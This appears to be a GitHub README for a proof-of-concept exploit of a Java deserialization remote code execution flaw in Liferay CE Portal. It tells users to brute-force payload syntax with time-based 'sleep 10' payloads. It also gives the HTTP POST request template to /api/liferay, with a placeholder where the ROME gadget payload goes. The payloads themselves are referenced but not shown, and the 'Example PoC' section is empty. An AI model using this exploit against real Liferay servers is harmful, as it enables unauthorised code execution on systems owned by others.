# Liferay-CE-Portal-Java-Deserialization
This repo contains PoC for the remote code execution vulnerability of Liferay CE Portal!

# Payloads
I already shared payloads in repo. You must find the right syntax by brute-force method.Payloads I share are for time-based proof of concept (sleep 10). The application may not always output the command. That's why you should try time-based payload while doing PoC.

# Proof Of Concept

POST /api/liferay HTTP/1.1

Host: TARGET  

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Connection: close


ROME-PAYLOAD-FILE

# Example PoC
